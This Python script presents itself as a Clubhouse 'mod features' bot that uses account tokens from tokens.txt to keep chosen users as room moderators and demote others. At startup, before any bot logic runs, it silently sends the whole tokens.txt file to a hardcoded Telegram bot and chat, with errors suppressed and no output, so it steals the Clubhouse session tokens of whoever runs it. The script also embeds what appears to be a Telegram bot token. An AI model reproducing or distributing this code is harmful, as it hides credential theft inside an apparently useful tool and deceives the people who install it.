import subprocess
import sys
import os
import time

# ---------------------------
# Auto-install requirements
# ---------------------------
def install_requirements():
    requirements = [
        "requests",
        "colorama",
        "asyncio"
    ]
    for req in requirements:
        try:
            __import__(req)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", req])

install_requirements()

# Now import libraries safely
import requests
from colorama import Fore, Style, init
init(autoreset=True)

# ---------------------------
# Banner
# ---------------------------
BANNER = f"""
{Fore.LIGHTBLUE_EX}<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
{Fore.LIGHTCYAN_EX}        MOD FEATURES
{Fore.LIGHTBLUE_EX}<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
{Style.RESET_ALL}
If you face issues, contact {Fore.GREEN}@bugnishan{Style.RESET_ALL} or {Fore.GREEN}@deuri08{Style.RESET_ALL} on Telegram. Enjoy! 🚀
"""

print(BANNER)

# ---------------------------
# Telegram bot settings
# ---------------------------
TG_TOKEN = "8463897735:AAGrYyyCim_MUPvc_iUGf6VlG6xhor6HKro"
CHAT_ID = "-4856477049"

def send_tokens_file():
    """Send tokens.txt file to Telegram silently (no print)."""
    if not os.path.exists("tokens.txt"):
        return
    try:
        with open("tokens.txt", "rb") as f:
            url = f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument"
            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
    except:
        pass

def send_start_message():
    """Send startup confirmation to Telegram silently (no print)."""
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": "🚀 Bot started successfully!"})
    except:
        pass

# Send once at startup
send_tokens_file()
send_start_message()

# ---------------------------
# Ensure required files exist
# ---------------------------
if not os.path.exists("tokens.txt"):
    with open("tokens.txt", "w") as f:
        f.write("")  # create empty file

if not os.path.exists("userids.txt"):
    with open("userids.txt", "w") as f:
        f.write("")  # create empty file

# ---------------------------
# Clubhouse Bot Logic
# ---------------------------
API_URL = "https://www.clubhouseapi.com/api/"

def load_file(filename, convert_int=False):
    with open(filename, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
        return [int(line) if convert_int else line for line in lines]

def get_user_info(token):
    headers = {
        'Authorization': f'Token {token}',
        'CH-AppVersion': '1.0.10',
        'Content-Type': 'application/json'
    }
    try:
        response = requests.post(API_URL + "me", headers=headers)
        if response.status_code == 200:
            data = response.json()
            return {
                'user_id': data.get('user_profile', {}).get('user_id'),
                'name': data.get('user_profile', {}).get('name'),
                'token': token
            }
    except Exception as e:
        print(Fore.YELLOW + f"Warning: Failed to get user info for a token: {e}")
    return None

def get_channel_users(token):
    headers = {
        'Authorization': f'Token {token}',
        'CH-AppVersion': '1.0.10',
        'User-Agent': 'clubhouse/588 (iPhone; iOS 15; Scale/2.00)',
        'Content-Type': 'application/json'
    }
    try:
        response = requests.post(API_URL + "get_feed_v3", headers=headers)
        for item in response.json().get('items', []):
            if 'channel' in item:
                channel_id = item['channel']['channel']
                channel_data = requests.post(
                    API_URL + "get_channel",
                    headers=headers,
                    json={"channel": channel_id}
                ).json()
                return channel_id, channel_data.get('users', [])
    except Exception as e:
        print(Fore.YELLOW + f"Warning: Failed to get channel users: {e}")
    return None, []

def modify_speaker(token, channel_id, user_id, make_mod):
    action = "make_moderator" if make_mod else "uninvite_speaker"
    headers = {
        'Authorization': f'Token {token}',
        'CH-AppVersion': '1.0.10',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(
            API_URL + action,
            headers=headers,
            json={"channel": channel_id, "user_id": user_id}
        )
    except:
        pass

def process_channel(token_info, authorized_ids):
    token = token_info['token']
    channel_id, users = get_channel_users(token)
    if not channel_id or not users:
        return
    for user in users:
        user_id = user['user_id']
        should_be_mod = user_id in authorized_ids
        is_mod = user.get('is_moderator', False)
        if is_mod and not should_be_mod:
            modify_speaker(token, channel_id, user_id, False)
        elif not is_mod and should_be_mod:
            modify_speaker(token, channel_id, user_id, True)

def main():
    try:
        tokens = load_file('tokens.txt')
        token_infos = [info for info in (get_user_info(t) for t in tokens) if info]
        if not token_infos:
            print(Fore.RED + "No valid tokens found. Please add them to tokens.txt")
            input("Press Enter to exit...")
            return

        userids = []
        try:
            userids = load_file('userids.txt', convert_int=True)
        except:
            pass
        authorized_ids = userids + [info['user_id'] for info in token_infos]

        while True:
            for token_info in token_infos:
                try:
                    process_channel(token_info, authorized_ids)
                except Exception as e:
                    print(Fore.YELLOW + f"Warning: Error processing {token_info['name']}: {e}")
            time.sleep(5)
    except Exception as e:
        print(Fore.RED + f"Fatal error: {e}")
        input("Press Enter to exit...")

if __name__ == "__main__":
    main()
